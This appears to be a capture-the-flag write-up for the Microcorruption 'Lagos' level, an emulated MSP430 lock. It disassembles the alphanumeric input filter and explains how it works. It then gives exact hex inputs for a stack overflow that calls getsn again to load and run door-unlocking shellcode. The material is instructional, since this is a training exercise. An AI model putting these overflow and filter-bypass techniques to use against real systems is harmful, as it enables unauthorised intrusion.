# For Lagos in microcorruption

>     This is  Software Revision  04. Due to  user confusion  over which
    characters passwords may contain,  only alphanumeric passwords are
    accepted.

This challenge has neither ASLR nor DEP protection. It just limits the input to alphanumeric values (ie `[A-z0-9]` ).


#### Dissecting the program.


Even though the program reminds that "passwords are between 8 and 16 characters", it actually reads 200 characters into address `0x2400`.
```
4584:  3e40 0002      mov	#0x200, r14
4588:  3f40 0024      mov	#0x2400, r15
458c:  b012 5046      call	#0x4650 <getsn>
```

It then copies user input onto the top of the stack assuming all of them are alphanumeric characters. The program breaks out of the loop once an invalid character is found. 
```
45ae:  4b4f           mov.b	r15, r11
45b0:  7b50 d0ff      add.b	#0xffd0, r11
45b4:  4c9b           cmp.b	r11, r12	
45b6:  f42f           jc	#0x45a0 <login+0x42>	# copy user input to stack if it's =< '9' or => '0'
45b8:  7b50 efff      add.b	#0xffef, r11
45bc:  4d9b           cmp.b	r11, r13
45be:  f02f           jc	#0x45a0 <login+0x42>	# copy user input to stack if it's =< 'Z' or => 'A'
45c0:  7b50 e0ff      add.b	#0xffe0, r11
45c4:  4d9b           cmp.b	r11, r13
45c6:  ec2f           jc	#0x45a0 <login+0x42>	# copy user input to stack if it's =< 'z' or => 'a'
```


The way the program sanitises user input may look confusing, but it's actually very smart. I shall explain using the first check as an example. The program wants to make sure that the input is between '0' and '9'. The hex values of these 2 characters are 0x30 and 0x39 respectively. `add.b #0xffd0, r11` adds 0xffd0 to `r11`, and stores the least significant byte into `r11`. The carry flag is then set if `r11` is *smaller* than 0x9 (ie 0 =< `r11` =< 9). Let's see how it works with 3 test cases:

1. Input: '/' (hex value 0x2f). (0x2f + 0xffd0) & 0xff = 0xff. Since 0xff > 0x9, the carry flag is not set, and the input fails the sanitation check.

2. Input: '5' (hex value 0x35). (0x35 + 0xffd0) & 0xff = 0x05. Since 0x05 < 0x9, the carry flag is set, and the input passes the sanitaion check. 

3. Input: ':' (hex value 0x3a). (0x3a + 0xffd0) & 0xff = 0x0a. Since 0x0a > 0x9, the carry flag is not set, and the input fails the sanitation check.

Ok. We know that the program walks the talk. It sanitises user input and accepts only alphanumeric characters. The sanitised user input is stored starting in address `0x43ec`.

```
45d2:  3f40 0024      mov	#0x2400, r15
45d6:  b012 8c46      call	#0x468c <memset>
```
`<memset>` then clears all the bytes around address `0x2400` where the user input was read into memory by `<getsn>`.

```
45da:  0f41           mov	sp, r15
45dc:  b012 4644      call	#0x4446 <conditional_unlock_door>
```
Then, the program tests the sanitised user input using `INT 0x7E` in `<conditional_unlock_door>` to unlock the door if the password is correct.

The program then returns to `<main>`. The user input sanitiser does not care *how many* valid characters we enter into the program, we can smash the stack by overwriting the `ret` address located in address `0x43fe`.
```
45f2:  3150 1000      add	#0x10, sp
45f6:  3b41           pop	r11
45f8:  3041           ret
```
#### Exploiting the program

We can smash the stack, but since our user input is limited to hex values `0x30 to 0x39`, `0x41 to 0x5A`, and `0x61 to 0x7A`, the addresses we can return to is limited. There is also no `INT 0x7F` present in the program to redirect execution to. So what do we do? Like the challenge Bangalore, we can recall `<getsn>` to read another set of input. The difference here is that instead of bypassing the DEP memory protection, here we are bypassing the user input sanitation. That way we can input our shellcode `mov #0xff00, sr; call #0x10` into memory, then redirect program execution there to unlock the door.

Input 1: `41414141414141414141414141414141415446424130304241`
  
- `4141414141414141414141414141414141` is the padding.
  
- `544642413030` returns to address `0x4654` with arguments `0x4142` and `0x3030`. It is equivalent to calling the function `getsn(0x4142, 0x3030 chars)`. It reads Input 2 into memory address `0x4142`. The address is chosen because it is word aligned and its characters are alphanumeric.

- `4241` then returns to address `0x4142` where our shellcode is located.

Input 2: `324000ffb0121000`

- It is our shellcode for `mov #0xff00, sr; call #0x10`. Since user input sanitation is bypassed, this input is "valid". 

Key in Input 1 & 2 into the program and we successfully unlock the door.

END

